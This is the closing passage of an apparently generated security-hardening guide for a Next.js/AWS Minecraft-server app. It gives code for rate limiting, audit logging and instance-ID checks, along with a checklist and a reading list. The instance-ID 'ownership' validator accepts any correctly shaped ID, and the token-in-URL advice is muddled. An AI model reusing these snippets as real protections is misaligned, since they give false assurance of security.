  resetMockStateStore();
  return NextResponse.json({ success: true });
}
```

**4. Validate Instance ID Ownership**

```typescript
// lib/aws/permission-validator.ts

const ALLOWED_INSTANCE_TAG = 'MinecraftServer';
const ALLOWED_STACK_TAG_PREFIX = 'MinecraftStack/';

export function validateInstanceIdOwnership(instanceId: string): boolean {
  // Check if instance is our known instance
  if (instanceId === env.INSTANCE_ID) {
    return true;
  }

  // Check tags (requires API call - cache result)
  // This is simplified - in reality, check against approved resource IDs
  return instanceId.startsWith('i-') && instanceId.length === 19;
}

// Usage in routes requiring instance ID
export async function POST(request: NextRequest) {
  const { instanceId } = await request.json();
  const resolvedId = instanceId || await findInstanceId();

  if (!validateInstanceIdOwnership(resolvedId)) {
    return NextResponse.json({ error: 'Invalid instance ID' }, { status: 403 });
  }

  // ... proceed
}
```

### Priority 2: Important Enhancements

**5. Extend Rate Limiting**

Apply to critical endpoints:

```typescript
// app/api/backup/route.ts

export async function POST(request: NextRequest) {
  const { email, role } = await requireAdmin(request);

  const clientIp = getClientIp(request.headers);
  const result = await checkRateLimit({
    key: `admin:backup:${email}`, // Per-user rate limit
    limit: 10,
    windowMs: 60_000,
  });

  if (!result.allowed) {
    return NextResponse.json(
      { success: false, error: 'Too many attempts. Please try again later.' },
      { status: 429 },
    );
  }

  // ... proceed
}
```

**6. Audit Logging**

```typescript
// lib/audit-logger.ts

interface AuditEvent {
  action: string;
  userId: string;
  role: UserRole;
  metadata: Record<string, unknown>;
  timestamp: string;
}

export async function logAuditEvent(event: AuditEvent) {
  console.log(`[AUDIT] ${event.action} by ${event.userId} (${event.role})`, event.metadata);

  // In production, send to CloudWatch Logs, structured logging, or audit system
}

// Usage:
await logAuditEvent({
  action: 'BACKUP_INITIATED',
  userId: email,
  role,
  metadata: { instanceId, backupName },
  timestamp: new Date().toISOString(),
});
```

**7. Reduce Secrets Exposure in CLI**

```typescript
// infra/src/ec2/user_data.sh

# Instead of:
# git clone https://user:$GITHUB_PAT@github.com/...

# Use:
# git clone https://$GITHUB_PAT@github.com/...  # PAT in URL is logged

# Better: Use git credential helper or deploy via CI/CD with managed identity
```

### Priority 3: Long-term Hardening

**8. Private Subnet Architecture**
- Deploy EC2 instance in private subnet
- Access via Session Manager or VPN
- Remove public IP assignment

**9. Web Application Firewall (WAF)**
- Deploy AWS WAF in front of app
- Block common attack patterns (SQLi, XSS)
- Rate limiting at edge

**10. Secrets Rotation**
- Automate rotation of AUTH_SECRET, GITHUB_PAT
- Use AWS Secrets Manager for rotation automation

**11. Monitoring and Alerting**
- CloudWatch alarms for unexpected API error rates
- Failed authentication attempt spikes
- IAM policy deny events

**12. Regular Security Reviews**
- Quarterly dependency updates
- Annual penetration testing
- IAM policy least-privilege audits

---

## Summary Checklist

### Immediate (Do Now)
- [ ] Add security headers via middleware
- [ ] Sanitize all error messages shown to users
- [ ] Disable unauthenticated mock endpoints or add env gate
- [ ] Update transitive dependency with low advisory
- [ ] Add audit logging for admin actions

### Short-term (Next Sprint)
- [ ] Extend rate limiting to all mutation endpoints
- [ ] Add instance ID ownership validation
- [ ] Move secrets out of command-line arguments
- [ ] Add integration tests for auth flows

### Medium-term (Next Quarter)
- [ ] Deploy WAF for web endpoint protection
- [ ] Implement real-time monitoring and alerting
- [ ] Network architecture review (consider private subnets)
- [ ] Automated secrets rotation

### Long-term (Ongoing)
- [ ] Regular security training for team
- [ ] Annual third-party security assessment
- [ ] Keep dependencies updated monthly
- [ ] Document incident response procedures

---

## Further Learning

### Essential Reading
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - Most critical web security risks
- [OAuth 2.0 Simplified](https://www.oauth.com/) - Deep dive on OAuth security
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)

### Practice
- Setup a test environment with intentionally vulnerable code
- Try OWASP Juice Shop or Damn Vulnerable Web App
- Practice security-focused testing on your own projects

### Tools to Explore
- **Snyk** - Dependency vulnerability scanning
- **SonarQube** - Code quality and security
- **AWS Security Hub** - Centralized security alerting
- **HashiCorp Vault** - Advanced secrets management

---

## Key Takeaways

1. **Layer your defenses:** Authentication → Authorization → Input Validation → Infrastructure controls
2. **Never trust input:** Validate all user input, even from authenticated users
3. **Least privilege everywhere:** IAM policies, database permissions, file system access
4. **Security headers matter:** CSP, HSTS, X-Frame-Options provide browser-level protection
5. **Keep secrets secret:** Never commit credentials, use IAM roles for AWS, rotate regularly
6. **Error messages leak info:** Sanitize errors shown to users, log full details server-side
7. **Test security invariants:** Write tests for auth gates, state validation, permission checks
8. **Monitor and respond:** Set up alerts for anomalies, have incident response plans

---

**Remember:** Security is not a feature you add at the end—it's a mindset applied throughout development. Every decision about data flow, API design, and infrastructure has security implications.

---

*Generated for mc-aws project security education*